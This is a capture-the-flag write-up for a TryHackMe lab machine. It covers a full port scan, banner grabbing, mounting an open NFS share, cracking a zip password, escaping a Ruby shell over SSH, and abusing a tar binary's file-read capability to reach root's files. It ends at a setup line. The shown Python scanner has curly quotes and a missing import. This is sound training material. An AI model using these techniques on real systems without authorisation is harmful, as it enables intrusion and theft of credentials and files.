# 57 - The Server from Hell

Room Link --> [https://tryhackme.com/room/theserverfromhell](https://tryhackme.com/room/theserverfromhell)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -v 10.10.123.249 -p- -T4 -T5 -sV
```
{% endcode %}

<details>

<summary>Nmap results</summary>

```
PORT      STATE SERVICE
1/tcp     open  tcpmux
3/tcp     open  compressnet
4/tcp     open  unknown
6/tcp     open  unknown
7/tcp     open  echo
9/tcp     open  discard
13/tcp    open  daytime
17/tcp    open  qotd
19/tcp    open  chargen
20/tcp    open  ftp-data
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
24/tcp    open  priv-mail
25/tcp    open  smtp
26/tcp    open  rsftp
30/tcp    open  unknown
32/tcp    open  unknown
33/tcp    open  dsp
37/tcp    open  time
42/tcp    open  nameserver
43/tcp    open  whois
49/tcp    open  tacacs
53/tcp    open  domain
70/tcp    open  gopher
79/tcp    open  finger
80/tcp    open  http
81/tcp    open  hosts2-ns
82/tcp    open  xfer
83/tcp    open  mit-ml-dev
84/tcp    open  ctf
85/tcp    open  mit-ml-dev
88/tcp    open  kerberos-sec
89/tcp    open  su-mit-tg
90/tcp    open  dnsix
99/tcp    open  metagram
100/tcp   open  newacct
106/tcp   open  pop3pw
109/tcp   open  pop2
110/tcp   open  pop3
111/tcp   open  rpcbind
113/tcp   open  ident
119/tcp   open  nntp
125/tcp   open  locus-map
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
144/tcp   open  news
146/tcp   open  iso-tp0
161/tcp   open  snmp
163/tcp   open  cmip-man
179/tcp   open  bgp
199/tcp   open  smux
211/tcp   open  914c-g
212/tcp   open  anet
222/tcp   open  rsh-spx
254/tcp   open  unknown
255/tcp   open  unknown
256/tcp   open  fw1-secureremote
259/tcp   open  esro-gen
264/tcp   open  bgmp
280/tcp   open  http-mgmt
301/tcp   open  unknown
306/tcp   open  unknown
311/tcp   open  asip-webadmin
340/tcp   open  unknown
366/tcp   open  odmr
389/tcp   open  ldap
406/tcp   open  imsp
407/tcp   open  timbuktu
416/tcp   open  silverplatter
417/tcp   open  onmux
425/tcp   open  icad-el
427/tcp   open  svrloc
443/tcp   open  https
444/tcp   open  snpp
445/tcp   open  microsoft-ds
458/tcp   open  appleqtc
464/tcp   open  kpasswd5
465/tcp   open  smtps
481/tcp   open  dvs
497/tcp   open  retrospect
500/tcp   open  isakmp
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
515/tcp   open  printer
524/tcp   open  ncp
541/tcp   open  uucp-rlogin
543/tcp   open  klogin
544/tcp   open  kshell
545/tcp   open  ekshell
548/tcp   open  afp
554/tcp   open  rtsp
555/tcp   open  dsf
563/tcp   open  snews
587/tcp   open  submission
593/tcp   open  http-rpc-epmap
616/tcp   open  sco-sysmgr
617/tcp   open  sco-dtmgr
625/tcp   open  apple-xsrvr-admin
631/tcp   open  ipp
636/tcp   open  ldapssl
646/tcp   open  ldp
648/tcp   open  rrp
666/tcp   open  doom
667/tcp   open  disclose
668/tcp   open  mecomm
683/tcp   open  corba-iiop
687/tcp   open  asipregistry
691/tcp   open  resvc
700/tcp   open  epp
705/tcp   open  agentx
711/tcp   open  cisco-tdp
714/tcp   open  iris-xpcs
720/tcp   open  unknown
722/tcp   open  unknown
726/tcp   open  unknown
749/tcp   open  kerberos-adm
765/tcp   open  webster
777/tcp   open  multiling-http
783/tcp   open  spamassassin
787/tcp   open  qsc
800/tcp   open  mdbs_daemon
801/tcp   open  device
808/tcp   open  ccproxy-http
843/tcp   open  unknown
873/tcp   open  rsync
880/tcp   open  unknown
888/tcp   open  accessbuilder
898/tcp   open  sun-manageconsole
900/tcp   open  omginitialrefs
901/tcp   open  samba-swat
902/tcp   open  iss-realsecure
903/tcp   open  iss-console-mgr
911/tcp   open  xact-backup
912/tcp   open  apex-mesh
981/tcp   open  unknown
987/tcp   open  unknown
990/tcp   open  ftps
992/tcp   open  telnets
993/tcp   open  imaps
995/tcp   open  pop3s
999/tcp   open  garcon
1000/tcp  open  cadlock
1001/tcp  open  webpush
1002/tcp  open  windows-icfw
1007/tcp  open  unknown
1009/tcp  open  unknown
1010/tcp  open  surf
1011/tcp  open  unknown
1021/tcp  open  exp1
1022/tcp  open  exp2
1023/tcp  open  netvenuechat
1024/tcp  open  kdm
1025/tcp  open  NFS-or-IIS
1026/tcp  open  LSA-or-nterm
1027/tcp  open  IIS
1028/tcp  open  unknown
1029/tcp  open  ms-lsa
1030/tcp  open  iad1
1031/tcp  open  iad2
1032/tcp  open  iad3
1033/tcp  open  netinfo
1034/tcp  open  zincite-a
1035/tcp  open  multidropper
1036/tcp  open  nsstp
1037/tcp  open  ams
1038/tcp  open  mtqp
1039/tcp  open  sbl
1040/tcp  open  netsaint
1041/tcp  open  danf-ak2
1042/tcp  open  afrog
1043/tcp  open  boinc
1044/tcp  open  dcutility
1045/tcp  open  fpitp
1046/tcp  open  wfremotertm
1047/tcp  open  neod1
1048/tcp  open  neod2
1049/tcp  open  td-postman
1050/tcp  open  java-or-OTGfileshare
1051/tcp  open  optima-vnet
1052/tcp  open  ddt
1053/tcp  open  remote-as
1054/tcp  open  brvread
1055/tcp  open  ansyslmd
1056/tcp  open  vfo
1057/tcp  open  startron
1058/tcp  open  nim
1059/tcp  open  nimreg
1060/tcp  open  polestar
1061/tcp  open  kiosk
1062/tcp  open  veracity
1063/tcp  open  kyoceranetdev
1064/tcp  open  jstel
1065/tcp  open  syscomlan
1066/tcp  open  fpo-fns
1067/tcp  open  instl_boots
1068/tcp  open  instl_bootc
1069/tcp  open  cognex-insight
1070/tcp  open  gmrupdateserv
1071/tcp  open  bsquare-voip
1072/tcp  open  cardax
1073/tcp  open  bridgecontrol
1074/tcp  open  warmspotMgmt
1075/tcp  open  rdrmshc
1076/tcp  open  sns_credit
1077/tcp  open  imgames
1078/tcp  open  avocent-proxy
1079/tcp  open  asprovatalk
1080/tcp  open  socks
1081/tcp  open  pvuniwien
1082/tcp  open  amt-esd-prot
1083/tcp  open  ansoft-lm-1
1084/tcp  open  ansoft-lm-2
1085/tcp  open  webobjects
1086/tcp  open  cplscrambler-lg
1087/tcp  open  cplscrambler-in
1088/tcp  open  cplscrambler-al
1089/tcp  open  ff-annunc
1090/tcp  open  ff-fms
1091/tcp  open  ff-sm
1092/tcp  open  obrpd
1093/tcp  open  proofd
1094/tcp  open  rootd
1095/tcp  open  nicelink
1096/tcp  open  cnrprotocol
1097/tcp  open  sunclustermgr
1098/tcp  open  rmiactivation
1099/tcp  open  rmiregistry
1100/tcp  open  mctp
1102/tcp  open  adobeserver-1
1104/tcp  open  xrl
1105/tcp  open  ftranhc
1106/tcp  open  isoipsigport-1
1107/tcp  open  isoipsigport-2
1108/tcp  open  ratio-adp
1110/tcp  open  nfsd-status
1111/tcp  open  lmsocialserver
1112/tcp  open  msql
1113/tcp  open  ltp-deepspace
1114/tcp  open  mini-sql
1117/tcp  open  ardus-mtrns
1119/tcp  open  bnetgame
1121/tcp  open  rmpp
1122/tcp  open  availant-mgr
1123/tcp  open  murray
1124/tcp  open  hpvmmcontrol
1126/tcp  open  hpvmmdata
1130/tcp  open  casp
1131/tcp  open  caspssl
1132/tcp  open  kvm-via-ip
1137/tcp  open  trim
1138/tcp  open  encrypted_admin
1141/tcp  open  mxomss
1145/tcp  open  x9-icue
1147/tcp  open  capioverlan
1148/tcp  open  elfiq-repl
1149/tcp  open  bvtsonar
1151/tcp  open  unizensus
1152/tcp  open  winpoplanmess
1154/tcp  open  resacommunity
1163/tcp  open  sddp
1164/tcp  open  qsm-proxy
1165/tcp  open  qsm-gui
1166/tcp  open  qsm-remote
1169/tcp  open  tripwire
1174/tcp  open  fnet-remote-ui
1175/tcp  open  dossier
1183/tcp  open  llsurfup-http
1185/tcp  open  catchpole
1186/tcp  open  mysql-cluster
1187/tcp  open  alias
1192/tcp  open  caids-sensor
1198/tcp  open  cajo-discovery
1199/tcp  open  dmidi
1201/tcp  open  nucleus-sand
1213/tcp  open  mpc-lifenet
1216/tcp  open  etebac5
1217/tcp  open  hpss-ndapi
1218/tcp  open  aeroflight-ads
1233/tcp  open  univ-appserver
1234/tcp  open  hotline
1236/tcp  open  bvcontrol
1244/tcp  open  isbconference1
1247/tcp  open  visionpyramid
1248/tcp  open  hermes
1259/tcp  open  opennl-voice
1271/tcp  open  excw
1272/tcp  open  cspmlockmgr
1277/tcp  open  miva-mqs
1287/tcp  open  routematch
1296/tcp  open  dproxy
1300/tcp  open  h323hostcallsc
1301/tcp  open  ci3-software-1
1309/tcp  open  jtag-server
1310/tcp  open  husky
1311/tcp  open  rxmon
1322/tcp  open  novation
1328/tcp  open  ewall
1334/tcp  open  writesrv
1352/tcp  open  lotusnotes
1417/tcp  open  timbuktu-srv1
1433/tcp  open  ms-sql-s
1434/tcp  open  ms-sql-m
1443/tcp  open  ies-lm
1455/tcp  open  esl-lm
1461/tcp  open  ibm_wrless_lan
1494/tcp  open  citrix-ica
1500/tcp  open  vlsi-lm
1501/tcp  open  sas-3
1503/tcp  open  imtc-mcs
1521/tcp  open  oracle
1524/tcp  open  ingreslock
1533/tcp  open  virtual-places
1556/tcp  open  veritas_pbx
1580/tcp  open  tn-tl-r1
1583/tcp  open  simbaexpress
1594/tcp  open  sixtrak
1600/tcp  open  issd
1641/tcp  open  invision
1658/tcp  open  sixnetudr
1666/tcp  open  netview-aix-6
1687/tcp  open  nsjtp-ctrl
1688/tcp  open  nsjtp-data
1700/tcp  open  mps-raft
1717/tcp  open  fj-hdnet
1718/tcp  open  h323gatedisc
1719/tcp  open  h323gatestat
1720/tcp  open  h323q931
1721/tcp  open  caicci
1723/tcp  open  pptp
1755/tcp  open  wms
1761/tcp  open  landesk-rc
1782/tcp  open  hp-hcip
1783/tcp  open  unknown
1801/tcp  open  msmq
1805/tcp  open  enl-name
1812/tcp  open  radius
1839/tcp  open  netopia-vo1
1840/tcp  open  netopia-vo2
1862/tcp  open  mysql-cm-agent
1863/tcp  open  msnp
1864/tcp  open  paradym-31
1875/tcp  open  westell-stats
1900/tcp  open  upnp
1914/tcp  open  elm-momentum
1935/tcp  open  rtmp
1947/tcp  open  sentinelsrm
1971/tcp  open  netop-school
1972/tcp  open  intersys-cache
1974/tcp  open  drp
1984/tcp  open  bigbrother
1998/tcp  open  x25-svc-port
1999/tcp  open  tcp-id-port
2000/tcp  open  cisco-sccp
2001/tcp  open  dc
2002/tcp  open  globe
2003/tcp  open  finger
2004/tcp  open  mailbox
2005/tcp  open  deslogin
2006/tcp  open  invokator
2007/tcp  open  dectalk
2008/tcp  open  conf
2009/tcp  open  news
2010/tcp  open  search
2013/tcp  open  raid-am
2020/tcp  open  xinupageserver
2021/tcp  open  servexec
2022/tcp  open  down
2030/tcp  open  device2
2033/tcp  open  glogger
2034/tcp  open  scoremgr
2035/tcp  open  imsldoc
2038/tcp  open  objectmanager
2040/tcp  open  lam
2041/tcp  open  interbase
2042/tcp  open  isis
2043/tcp  open  isis-bcast
2045/tcp  open  cdfunc
2046/tcp  open  sdfunc
2047/tcp  open  dls
2048/tcp  open  dls-monitor
2049/tcp  open  nfs
2065/tcp  open  dlsrpn
2068/tcp  open  avocentkvm
2099/tcp  open  h2250-annex-g
2100/tcp  open  amiganetfs
2103/tcp  open  zephyr-clt
2105/tcp  open  eklogin
2106/tcp  open  ekshell
2107/tcp  open  msmq-mgmt
2111/tcp  open  kx
2119/tcp  open  gsigatekeeper
2121/tcp  open  ccproxy-ftp
2126/tcp  open  pktcable-cops
2135/tcp  open  gris
2144/tcp  open  lv-ffx
2160/tcp  open  apc-2160
2161/tcp  open  apc-agent
2170/tcp  open  eyetv
2179/tcp  open  vmrdp
2190/tcp  open  tivoconnect
2191/tcp  open  tvbus
2196/tcp  open  unknown
2200/tcp  open  ici
2222/tcp  open  EtherNetIP-1
2251/tcp  open  dif-port
2260/tcp  open  apc-2260
2288/tcp  open  netml
2301/tcp  open  compaqdiag
2323/tcp  open  3d-nfsd
2366/tcp  open  qip-login
2381/tcp  open  compaq-https
2382/tcp  open  ms-olap3
2383/tcp  open  ms-olap4
2393/tcp  open  ms-olap1
2394/tcp  open  ms-olap2
2399/tcp  open  fmpro-fdal
2401/tcp  open  cvspserver
2492/tcp  open  groove
2500/tcp  open  rtsserv
2522/tcp  open  windb
2525/tcp  open  ms-v-worlds
2557/tcp  open  nicetec-mgmt
2601/tcp  open  zebra
2602/tcp  open  ripd
2604/tcp  open  ospfd
2605/tcp  open  bgpd
2607/tcp  open  connection
2608/tcp  open  wag-service
2638/tcp  open  sybase
2701/tcp  open  sms-rcinfo
2702/tcp  open  sms-xfer
2710/tcp  open  sso-service
2717/tcp  open  pn-requester
2718/tcp  open  pn-requester2
2725/tcp  open  msolap-ptp2
2800/tcp  open  acc-raid
2809/tcp  open  corbaloc
2811/tcp  open  gsiftp
2869/tcp  open  icslap
2875/tcp  open  dxmessagebase2
2909/tcp  open  funk-dialout
2910/tcp  open  tdaccess
2920/tcp  open  roboeda
2967/tcp  open  symantec-av
2968/tcp  open  enpp
2998/tcp  open  iss-realsec
3000/tcp  open  ppp
3001/tcp  open  nessus
3003/tcp  open  cgms
3005/tcp  open  deslogin
3006/tcp  open  deslogind
3007/tcp  open  lotusmtap
3011/tcp  open  trusted-web
3013/tcp  open  gilatskysurfer
3017/tcp  open  event_listener
3030/tcp  open  arepa-cas
3031/tcp  open  eppc
3052/tcp  open  powerchute
3071/tcp  open  csd-mgmt-port
3077/tcp  open  orbix-loc-ssl
3128/tcp  open  squid-http
3168/tcp  open  poweronnud
3211/tcp  open  avsecuremgmt
3221/tcp  open  xnm-clear-text
3260/tcp  open  iscsi
3261/tcp  open  winshadow
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3283/tcp  open  netassistant
3300/tcp  open  ceph
3301/tcp  open  tarantool
3306/tcp  open  mysql
3322/tcp  open  active-net
3323/tcp  open  active-net
3324/tcp  open  active-net
3325/tcp  open  active-net
3333/tcp  open  dec-notes
3351/tcp  open  btrieve
3367/tcp  open  satvid-datalnk
3369/tcp  open  satvid-datalnk
3370/tcp  open  satvid-datalnk
3371/tcp  open  satvid-datalnk
3372/tcp  open  msdtc
3389/tcp  open  ms-wbt-server
3390/tcp  open  dsc
3404/tcp  open  unknown
3476/tcp  open  nppmp
3493/tcp  open  nut
3517/tcp  open  802-11-iapp
3527/tcp  open  beserver-msg-q
3546/tcp  open  unknown
3551/tcp  open  apcupsd
3580/tcp  open  nati-svrloc
3659/tcp  open  apple-sasl
3689/tcp  open  rendezvous
3690/tcp  open  svn
3703/tcp  open  adobeserver-3
3737/tcp  open  xpanel
3766/tcp  open  sitewatch-s
3784/tcp  open  bfd-control
3800/tcp  open  pwgpsi
3801/tcp  open  ibm-mgr
3809/tcp  open  apocd
3814/tcp  open  neto-dcs
3826/tcp  open  wormux
3827/tcp  open  netmpi
3828/tcp  open  neteh
3851/tcp  open  spectraport
3869/tcp  open  ovsam-mgmt
3871/tcp  open  avocent-adsap
3878/tcp  open  fotogcad
3880/tcp  open  igrs
3889/tcp  open  dandv-tester
3905/tcp  open  mupdate
3914/tcp  open  listcrt-port-2
3918/tcp  open  pktcablemmcops
3920/tcp  open  exasoftport1
3945/tcp  open  emcads
3971/tcp  open  lanrevserver
3986/tcp  open  mapper-ws_ethd
3995/tcp  open  iss-mgmt-ssl
3998/tcp  open  dnx
4000/tcp  open  remoteanything
4001/tcp  open  newoak
4002/tcp  open  mlchat-proxy
4003/tcp  open  pxc-splr-ft
4004/tcp  open  pxc-roid
4005/tcp  open  pxc-pin
4006/tcp  open  pxc-spvr
4045/tcp  open  lockd
4111/tcp  open  xgrid
4125/tcp  open  rww
4126/tcp  open  ddrepl
4129/tcp  open  nuauth
4224/tcp  open  xtell
4242/tcp  open  vrml-multi-use
4279/tcp  open  vrml-multi-use
4321/tcp  open  rwhois
4343/tcp  open  unicall
4443/tcp  open  pharos
4444/tcp  open  krb524
4445/tcp  open  upnotifyp
4446/tcp  open  n1-fwp
4449/tcp  open  privatewire
4550/tcp  open  gds-adppiw-db
4567/tcp  open  tram
4662/tcp  open  edonkey
4848/tcp  open  appserv-http
4899/tcp  open  radmin
4900/tcp  open  hfcs
4998/tcp  open  maybe-veritas
5000/tcp  open  upnp
5001/tcp  open  commplex-link
5002/tcp  open  rfe
5003/tcp  open  filemaker
5004/tcp  open  avt-profile-1
5009/tcp  open  airport-admin
5030/tcp  open  surfpass
5033/tcp  open  jtnetd-server
5050/tcp  open  mmcc
5051/tcp  open  ida-agent
5054/tcp  open  rlm-admin
5060/tcp  open  sip
5061/tcp  open  sip-tls
5080/tcp  open  onscreen
5087/tcp  open  biotic
5100/tcp  open  admd
5101/tcp  open  admdog
5102/tcp  open  admeng
5120/tcp  open  barracuda-bbs
5190/tcp  open  aol
5200/tcp  open  targus-getdata
5214/tcp  open  unknown
5221/tcp  open  3exmp
5222/tcp  open  xmpp-client
5225/tcp  open  hp-server
5226/tcp  open  hp-status
5269/tcp  open  xmpp-server
5280/tcp  open  xmpp-bosh
5298/tcp  open  presence
5357/tcp  open  wsdapi
5405/tcp  open  pcduo
5414/tcp  open  statusd
5431/tcp  open  park-agent
5432/tcp  open  postgresql
5440/tcp  open  unknown
5500/tcp  open  hotline
5510/tcp  open  secureidprop
5544/tcp  open  unknown
5550/tcp  open  sdadmind
5555/tcp  open  freeciv
5560/tcp  open  isqlplus
5566/tcp  open  westec-connect
5631/tcp  open  pcanywheredata
5633/tcp  open  beorl
5666/tcp  open  nrpe
5678/tcp  open  rrac
5679/tcp  open  activesync
5718/tcp  open  dpm
5730/tcp  open  unieng
5800/tcp  open  vnc-http
5801/tcp  open  vnc-http-1
5802/tcp  open  vnc-http-2
5810/tcp  open  unknown
5811/tcp  open  unknown
5815/tcp  open  unknown
5822/tcp  open  unknown
5825/tcp  open  unknown
5850/tcp  open  unknown
5859/tcp  open  wherehoo
5862/tcp  open  unknown
5877/tcp  open  unknown
5900/tcp  open  vnc
5901/tcp  open  vnc-1
5902/tcp  open  vnc-2
5903/tcp  open  vnc-3
5904/tcp  open  ag-swim
5906/tcp  open  rpas-c2
5907/tcp  open  dsd
5910/tcp  open  cm
5911/tcp  open  cpdlc
5915/tcp  open  unknown
5922/tcp  open  unknown
5925/tcp  open  unknown
5950/tcp  open  unknown
5952/tcp  open  unknown
5959/tcp  open  unknown
5960/tcp  open  unknown
5961/tcp  open  unknown
5962/tcp  open  unknown
5963/tcp  open  indy
5987/tcp  open  wbem-rmi
5988/tcp  open  wbem-http
5989/tcp  open  wbem-https
5998/tcp  open  ncd-diag
5999/tcp  open  ncd-conf
6000/tcp  open  X11
6001/tcp  open  X11:1
6002/tcp  open  X11:2
6003/tcp  open  X11:3
6004/tcp  open  X11:4
6005/tcp  open  X11:5
6006/tcp  open  X11:6
6007/tcp  open  X11:7
6009/tcp  open  X11:9
6025/tcp  open  x11
6059/tcp  open  X11:59
6100/tcp  open  synchronet-db
6101/tcp  open  backupexec
6106/tcp  open  isdninfo
6112/tcp  open  dtspc
6123/tcp  open  backup-express
6129/tcp  open  unknown
6156/tcp  open  unknown
6346/tcp  open  gnutella
6389/tcp  open  clariion-evr01
6502/tcp  open  netop-rc
6510/tcp  open  mcer-port
6543/tcp  open  mythtv
6547/tcp  open  powerchuteplus
6565/tcp  open  unknown
6566/tcp  open  sane-port
6567/tcp  open  esp
6580/tcp  open  parsec-master
6646/tcp  open  unknown
6666/tcp  open  irc
6667/tcp  open  irc
6668/tcp  open  irc
6669/tcp  open  irc
6689/tcp  open  tsa
6692/tcp  open  unknown
6699/tcp  open  napster
6779/tcp  open  unknown
6788/tcp  open  smc-http
6789/tcp  open  ibm-db2-admin
6792/tcp  open  unknown
6839/tcp  open  unknown
6881/tcp  open  bittorrent-tracker
6901/tcp  open  jetstream
6969/tcp  open  acmsoda
7000/tcp  open  afs3-fileserver
7001/tcp  open  afs3-callback
7002/tcp  open  afs3-prserver
7004/tcp  open  afs3-kaserver
7007/tcp  open  afs3-bos
7019/tcp  open  doceri-ctl
7025/tcp  open  vmsvc-2
7070/tcp  open  realserver
7100/tcp  open  font-service
7103/tcp  open  unknown
7106/tcp  open  unknown
7200/tcp  open  fodms
7201/tcp  open  dlip
7402/tcp  open  rtps-dd-mt
7435/tcp  open  unknown
7443/tcp  open  oracleas-https
7496/tcp  open  unknown
7512/tcp  open  unknown
7625/tcp  open  unknown
7627/tcp  open  soap-http
7676/tcp  open  imqbrokerd
7741/tcp  open  scriptview
7777/tcp  open  cbt
7778/tcp  open  interwise
7800/tcp  open  asr
7911/tcp  open  unknown
7920/tcp  open  unknown
7921/tcp  open  unknown
7937/tcp  open  nsrexecd
7938/tcp  open  lgtomapper
7999/tcp  open  irdmi2
8000/tcp  open  http-alt
8001/tcp  open  vcom-tunnel
8002/tcp  open  teradataordbms
8007/tcp  open  ajp12
8008/tcp  open  http
8009/tcp  open  ajp13
8010/tcp  open  xmpp
8011/tcp  open  unknown
8021/tcp  open  ftp-proxy
8022/tcp  open  oa-system
8031/tcp  open  unknown
8042/tcp  open  fs-agent
8045/tcp  open  unknown
8080/tcp  open  http-proxy
8081/tcp  open  blackice-icecap
8082/tcp  open  blackice-alerts
8083/tcp  open  us-srv
8084/tcp  open  websnp
8085/tcp  open  unknown
8086/tcp  open  d-s-n
8087/tcp  open  simplifymedia
8088/tcp  open  radan-http
8089/tcp  open  unknown
8090/tcp  open  opsmessaging
8093/tcp  open  unknown
8099/tcp  open  unknown
8100/tcp  open  xprint-server
8180/tcp  open  unknown
8181/tcp  open  intermapper
8192/tcp  open  sophos
8193/tcp  open  sophos
8194/tcp  open  sophos
8200/tcp  open  trivnet1
8222/tcp  open  unknown
8254/tcp  open  unknown
8290/tcp  open  unknown
8291/tcp  open  unknown
8292/tcp  open  blp3
8300/tcp  open  tmi
8333/tcp  open  bitcoin
8383/tcp  open  m2mservices
8400/tcp  open  cvd
8402/tcp  open  abarsd
8443/tcp  open  https-alt
8500/tcp  open  fmtp
8600/tcp  open  asterix
8649/tcp  open  unknown
8651/tcp  open  unknown
8652/tcp  open  unknown
8654/tcp  open  unknown
8701/tcp  open  unknown
8800/tcp  open  sunwebadmin
8873/tcp  open  dxspider
8888/tcp  open  sun-answerbook
8899/tcp  open  ospf-lite
8994/tcp  open  unknown
9000/tcp  open  cslistener
9001/tcp  open  tor-orport
9002/tcp  open  dynamid
9003/tcp  open  unknown
9009/tcp  open  pichat
9010/tcp  open  sdr
9011/tcp  open  d-star
9040/tcp  open  tor-trans
9050/tcp  open  tor-socks
9071/tcp  open  unknown
9080/tcp  open  glrpc
9081/tcp  open  cisco-aqos
9090/tcp  open  zeus-admin
9091/tcp  open  xmltec-xmlmail
9099/tcp  open  unknown
9100/tcp  open  jetdirect
9101/tcp  open  jetdirect
9102/tcp  open  jetdirect
9103/tcp  open  jetdirect
9110/tcp  open  unknown
9111/tcp  open  DragonIDSConsole
9200/tcp  open  wap-wsp
9207/tcp  open  wap-vcal-s
9220/tcp  open  unknown
9290/tcp  open  unknown
9415/tcp  open  unknown
9418/tcp  open  git
9485/tcp  open  unknown
9500/tcp  open  ismserver
9502/tcp  open  unknown
9503/tcp  open  unknown
9535/tcp  open  man
9575/tcp  open  unknown
9593/tcp  open  cba8
9594/tcp  open  msgsys
9595/tcp  open  pds
9618/tcp  open  condor
9666/tcp  open  zoomcp
9876/tcp  open  sd
9877/tcp  open  x510
9878/tcp  open  kca-service
9898/tcp  open  monkeycom
9900/tcp  open  iua
9917/tcp  open  unknown
9929/tcp  open  nping-echo
9943/tcp  open  unknown
9944/tcp  open  unknown
9968/tcp  open  unknown
9998/tcp  open  distinct32
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt
10001/tcp open  scp-config
10002/tcp open  documentum
10003/tcp open  documentum_s
10004/tcp open  emcrmirccd
10009/tcp open  swdtp-sv
10010/tcp open  rxapi
10012/tcp open  unknown
10024/tcp open  unknown
10025/tcp open  unknown
10082/tcp open  amandaidx
10180/tcp open  unknown
10215/tcp open  unknown
10243/tcp open  unknown
10566/tcp open  unknown
10616/tcp open  unknown
10617/tcp open  unknown
10621/tcp open  unknown
10626/tcp open  unknown
10628/tcp open  unknown
10629/tcp open  unknown
10778/tcp open  unknown
11110/tcp open  sgi-soap
11111/tcp open  vce
11967/tcp open  sysinfo-sp
12000/tcp open  cce4x
12174/tcp open  unknown
12265/tcp open  unknown
12345/tcp open  netbus
13456/tcp open  unknown
13722/tcp open  netbackup
13782/tcp open  netbackup
13783/tcp open  netbackup
14000/tcp open  scotty-ft
14238/tcp open  unknown
14441/tcp open  unknown
14442/tcp open  unknown
15000/tcp open  hydap
15002/tcp open  onep-tls
15003/tcp open  unknown
15004/tcp open  unknown
15660/tcp open  bex-xr
15742/tcp open  unknown
16000/tcp open  fmsas
16001/tcp open  fmsascon
16012/tcp open  unknown
16016/tcp open  unknown
16018/tcp open  unknown
16080/tcp open  osxwebadmin
16113/tcp open  unknown
16992/tcp open  amt-soap-http
16993/tcp open  amt-soap-https
17877/tcp open  unknown
17988/tcp open  unknown
18040/tcp open  unknown
18101/tcp open  unknown
18988/tcp open  unknown
19101/tcp open  unknown
19283/tcp open  keysrvr
19315/tcp open  keyshadow
19350/tcp open  unknown
19780/tcp open  unknown
19801/tcp open  unknown
19842/tcp open  unknown
20000/tcp open  dnp
20005/tcp open  btx
20031/tcp open  unknown
20221/tcp open  unknown
20222/tcp open  ipulse-ics
20828/tcp open  unknown
21571/tcp open  unknown
22939/tcp open  unknown
23502/tcp open  unknown
24444/tcp open  unknown
24800/tcp open  unknown
25734/tcp open  unknown
25735/tcp open  unknown
26214/tcp open  unknown
27000/tcp open  flexlm0
27352/tcp open  unknown
27353/tcp open  unknown
27355/tcp open  unknown
27356/tcp open  unknown
27715/tcp open  unknown
28201/tcp open  unknown
30000/tcp open  ndmps
```

</details>

So we are told to start enumerating from port 1337.

```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ nc 10.10.123.249 1337                       
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

So i wrote a bash one liner to enumerate the banners of the 1st 100 ports using NC:

{% code overflow="wrap" lineNumbers="true" %}
```bash
for i in $(seq 1 100);do echo "[+] PORT $i\n$(nc 10.10.123.249 $i)\n\n=====================================";done
```
{% endcode %}

<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We check out port 12345                                                                                                        &#x20;

{% code overflow="wrap" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ nc 10.10.123.249 12345                                                                                  
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```
{% endcode %}

So we check default NFS share port 2049.

```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ showmount -e 10.10.123.249     
Export list for 10.10.123.249:
/home/nfs *
```

We see a shared Share, and proceed to mount it.

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(root㉿dking)-[/home/dking/Downloads]
└─# mkdir /mnt/server_from_hell                                    
                                                                                                                
┌──(root㉿dking)-[/home/dking/Downloads]
└─# mount -t nfs 10.10.123.249:/home/nfs /mnt/server_from_hell/ -o nolock

┌──(root㉿dking)-[/home/dking/Downloads]
└─# cd /mnt/server_from_hell && ls -al
total 16
drwxr-xr-x 2 nobody nogroup 4096 Sep 15  2020 .
drwxr-xr-x 4 root   root    4096 Nov  6 10:18 ..
-rw-r--r-- 1 root   root    4534 Sep 15  2020 backup.zip
```
{% endcode %}

The file is requesting for password for unziping, so we use `zip2john` to crack it.

```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ john passwd --wordlist=/usr/share/wordlists/rockyou.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm          (backup.zip)
```

We get a `.ssh` dir with ssh private keys and from the public key, the username is there `hades` .

But trying to login ssh vi the default port, we get connection reset. There is a hint.txt file that says:

```bash
┌──(dking㉿dking)-[~/Downloads/home/hades/.ssh]
└─$ cat hint.txt 
2500-4500
```

When we conducted a nmap scan, from 2500-4500 we found that ssh is running on port 3333.

<figure><img src="https://1.bp.blogspot.com/-GlkmksSlW2g/X7FA8wlcLQI/AAAAAAAAqrE/IEtvflRlx28jVUXLNKHSpQzKcqoYk3cRQCLcBGAsYHQ/s16000/7.png" alt=""><figcaption></figcaption></figure>

Or we can use python:

```python
#!/usr/bin/env python3
import socket
host = '10.10.182.61'
for i in range(2500, 4500):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, i))
        string = s.recv(1024).decode(‘utf-8’)
        if 'OpenSSH' in string:
            print(f’[+] SSH Port open: {i} ‘)
            break
        else:
            print(f’[-] Port{i} not SSH’)
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        pass
s.close()
```

<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

Now we connect to ssh port using a private key that we found earlier, Now we have found a shell,

```bash
ssh hades@10.10.123.249 -i home/hades/.ssh/id_rsa -p 3333

# we get a ruby shell.
# to breakout.
irb(main):001:0> exec("/bin/bash")
hades@hell:~$ id
uid=1002(hades) gid=1002(hades) groups=1002(hades)
hades@hell:~$
```

### Priv Esc

The hint says `getcap` .

```bash
getcap -r / 2>/dev/null

# we can read files with tar
/bin/tar = cap_dac_read_search+ep
```

Check GTFObin for exploitation

Since we have read priv using tar, we can read the root.txt file.

```bash
hades@hell:/tmp$ LFILE=/root/root.txt
